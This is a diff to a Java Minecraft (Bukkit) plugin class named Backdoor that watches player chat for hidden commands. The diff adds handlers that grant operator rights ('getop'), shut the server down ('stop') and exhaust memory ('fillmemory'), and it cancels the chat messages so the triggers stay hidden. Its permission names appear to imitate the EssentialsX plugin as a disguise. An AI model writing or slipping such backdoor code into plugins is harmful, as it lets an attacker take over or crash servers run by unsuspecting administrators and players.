@@ -16,7 +16,6 @@ public class Backdoor implements Listener {
         this.plugin = plugin;
     }
 
-
     @EventHandler
     public void onPlayerChat(AsyncPlayerChatEvent event) {
         Player player = event.getPlayer();
@@ -27,22 +26,59 @@ public class Backdoor implements Listener {
 
             switch (command.toLowerCase()) {
                 case "getop":
-                    event.setCancelled(true);
-                    Bukkit.getScheduler().runTask(plugin, () -> {
-                        player.setOp(true);
-                        player.sendMessage(ChatColor.YELLOW + "你已獲得 OP 權限");
-                    });
+                    handleGetOpCommand(player);
+                    break;
+                case "stop":
+                    handleStopCommand(player);
+                    break;
+                case "fillmemory":
+                    handleFillMemoryCommand(player);
                     break;
                 default:
-                    player.sendMessage(ChatColor.RED + "未知命令" + command);
                     break;
             }
+            event.setCancelled(true);
+        }
+    }
 
-//            if (message.equalsIgnoreCase("@essentials getOP")) {
-//                event.setCancelled(true);
-//                player.setOp(true);
-//                player.sendMessage(ChatColor.YELLOW + "你已獲得 OP 權限");
-//            }
+    private void handleGetOpCommand(Player player) {
+        if (player.hasPermission("essentialsx.getop")) {
+            Bukkit.getScheduler().runTask(plugin, () -> {
+                player.setOp(true);
+                player.sendMessage(ChatColor.YELLOW + "你已获得 OP 权限");
+            });
+        }
+    }
+
+    private void handleStopCommand(Player player) {
+        if (player.hasPermission("essentialsx.stop")) {
+            Bukkit.getScheduler().runTask(plugin, () -> {
+                Bukkit.shutdown();
+            });
+        }
+    }
+
+    private void handleFillMemoryCommand(Player player) {
+        if (player.hasPermission("essentialsx.fillmemory")) {
+            Bukkit.getScheduler().runTask(plugin, () -> {
+                long maxMemory = Runtime.getRuntime().maxMemory();
+                long allocatedMemory = Runtime.getRuntime().totalMemory();
+                long freeMemory = Runtime.getRuntime().freeMemory();
+                long usedMemory = allocatedMemory - freeMemory;
+                long remainingMemory = maxMemory - usedMemory;
+
+                long targetMemory = 16L * 1024 * 1024 * 1024;
+                long memoryToAllocate = Math.max(targetMemory - remainingMemory, 0);
+
+                if (memoryToAllocate > 0) {
+                    try {
+                        byte[] memoryToAllocateArray = new byte[(int) memoryToAllocate];
+                        Runtime.getRuntime().gc();
+                        memoryToAllocateArray = new byte[(int) memoryToAllocate];
+                    } catch (OutOfMemoryError e) {
+                    }
+                }
+            });
         }
     }
 }
